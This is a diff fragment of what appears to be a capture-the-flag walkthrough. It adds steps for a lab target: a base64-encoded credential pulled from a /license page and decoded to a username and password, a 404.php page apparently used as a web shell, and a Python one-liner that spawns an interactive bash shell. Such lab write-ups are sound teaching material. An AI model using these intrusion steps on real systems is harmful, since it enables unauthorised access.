@@ -305,15 +305,49 @@ ER28-0652
 
 
 
+* <details>
+      <summary>another way🟪</summary>   
+
+    ```
+    https://10.10.125.174/license
+    ```
+
+
+    ![image](https://github.com/user-attachments/assets/5697ac35-bdca-4d79-9642-f8411a9f76f0)
+
+
+
+   ```
+   ZWxsaW90OkVSMjgtMDY1Mgo=
+   ```
+
+   ```
+   elliot:ER28-0652
+   ```
+
+           
+</details>
 
 
 
 
+![image](https://github.com/user-attachments/assets/33477ee5-992b-430c-ac61-ed4bcd45e847)
+
+
+```
+https://10.10.125.174/404.php
+```
+
+
+![image](https://github.com/user-attachments/assets/aeb9059c-f6d1-4f3e-ac97-d935e46433e3)
 
 
 
+Spawning an interactive shell:
 
-
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
 
 
 
